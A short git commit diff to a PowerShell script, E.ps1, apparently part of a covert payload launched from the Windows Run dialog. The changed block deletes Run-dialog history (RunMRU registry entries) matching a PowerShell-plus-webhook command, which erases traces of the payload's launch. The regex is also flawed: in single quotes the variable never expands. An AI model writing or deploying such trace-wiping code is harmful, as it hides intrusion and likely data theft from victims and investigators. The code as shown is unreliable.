39d43e7c5ee427b862e4358198653d1002f1d111
_Kubek_ <jakub.uzar@zse.krakow.pl>
2025-12-16 11:29:59 +0100

    Update E.ps1

--- E.ps1
+++ E.ps1
@@ -37,10 +37,11 @@ $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 $reg = Get-ItemProperty $path
 
 foreach ($p in $reg.PSObject.Properties) {
-    if ($p.Value -match '(?i)powershell\s+$webhook') {
+    if ($p.Value -match '(?i)powershell\s+$WEBHOOK') {
         Remove-ItemProperty -Path $path -Name $p.Name -ErrorAction SilentlyContinue
     }
 }
+
 
 
 
